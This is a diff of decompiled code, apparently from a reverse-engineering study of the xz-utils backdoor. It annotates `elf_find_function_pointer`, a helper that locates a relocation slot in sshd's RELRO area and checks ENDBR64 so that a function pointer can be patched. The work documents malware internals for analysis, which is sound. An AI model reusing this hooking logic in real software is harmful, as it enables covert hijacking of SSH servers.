@@ -5,9 +5,9 @@
 
 
 /*
- * AutoDoc: Given a populated string-reference entry, copies its `func_start`/`func_end` and searches RELA (then RELR) for a relocation that targets the function, treating the relocation address as the writable function-pointer slot.
- * The slot must live in RELRO (`elf_contains_vaddr_relro` enforces this); if the runtime flagged ENDBR usage, the referenced code is revalidated with `is_endbr64_instruction` before returning TRUE.
- * Returns FALSE when the xref is missing, no relocation is found, or the slot is outside RELRO.
+ * AutoDoc: Looks up the string-reference entry keyed by `xref_id`, copies its cached `[func_start, func_end)` range into the caller’s outputs, and then hunts for a relocation that targets that start address.
+ * It prefers RELA records (matching `r_addend` against the function pointer) and falls back to RELR bitmaps when the addend table is missing; whichever relocation hits becomes the writable slot returned via `pOutFptrAddr`.
+ * Success requires that slot to sit inside GNU_RELRO and, when CET telemetry says sshd uses ENDBR, a final `is_endbr64_instruction` check ensures the callee still begins with ENDBR so we never patch a stale helper. Missing xrefs or relocations immediately return FALSE.
  */
 
 #include "xzre_types.h"
@@ -17,33 +17,37 @@ BOOL elf_find_function_pointer
                elf_info_t *elf_info,string_references_t *xrefs,global_context_t *ctx)
 
 {
-  void *func_start;
-  BOOL ok;
-  Elf64_Rela *rela_slot;
-  Elf64_Relr *relr_slot;
+  void *xref_func_start;
+  BOOL slot_valid;
+  Elf64_Rela *rela_match;
+  Elf64_Relr *relr_match;
   
-  func_start = (&xrefs->xcalloc_zero_size)[xref_id].func_start;
-  if (func_start == (void *)0x0) {
+  xref_func_start = (&xrefs->xcalloc_zero_size)[xref_id].func_start;
+  if (xref_func_start == (void *)0x0) {
     return FALSE;
   }
-  *pOutCodeStart = func_start;
+  *pOutCodeStart = xref_func_start;
   *pOutCodeEnd = (&xrefs->xcalloc_zero_size)[xref_id].func_end;
-  rela_slot = elf_find_rela_reloc(elf_info,(EncodedStringId)*pOutCodeStart,0);
-  *pOutFptrAddr = rela_slot;
-  if (rela_slot == (Elf64_Rela *)0x0) {
-    relr_slot = elf_find_relr_reloc(elf_info,(EncodedStringId)*pOutCodeStart);
-    *pOutFptrAddr = relr_slot;
-    if (relr_slot == (Elf64_Relr *)0x0) {
+  // AutoDoc: Prefer RELA so we match the explicit addend/GOT slot before bothering with the packed RELR table.
+  rela_match = elf_find_rela_reloc(elf_info,(EncodedStringId)*pOutCodeStart,0);
+  *pOutFptrAddr = rela_match;
+  if (rela_match == (Elf64_Rela *)0x0) {
+    // AutoDoc: RELR fallback covers PIE builds where the GOT slot only appears inside the bitmap run.
+    relr_match = elf_find_relr_reloc(elf_info,(EncodedStringId)*pOutCodeStart);
+    *pOutFptrAddr = relr_match;
+    if (relr_match == (Elf64_Relr *)0x0) {
       return FALSE;
     }
   }
-  ok = elf_contains_vaddr_relro(elf_info,(long)*pOutFptrAddr - 8,0x10,1);
-  if (ok == FALSE) {
+  // AutoDoc: Only hand back slots inside GNU_RELRO; anything outside hardened memory is rejected.
+  slot_valid = elf_contains_vaddr_relro(elf_info,(long)*pOutFptrAddr - 8,0x10,1);
+  if (slot_valid == FALSE) {
     return FALSE;
   }
+  // AutoDoc: CET builds expect ENDBR at entry, so double-check the cached function really still starts with it.
   if (ctx->uses_endbr64 != FALSE) {
-    ok = is_endbr64_instruction((u8 *)*pOutCodeStart,(u8 *)((long)*pOutCodeStart + 4),0xe230);
-    return (uint)(ok != FALSE);
+    slot_valid = is_endbr64_instruction((u8 *)*pOutCodeStart,(u8 *)((long)*pOutCodeStart + 4),0xe230);
+    return (uint)(slot_valid != FALSE);
   }
   return TRUE;
 }
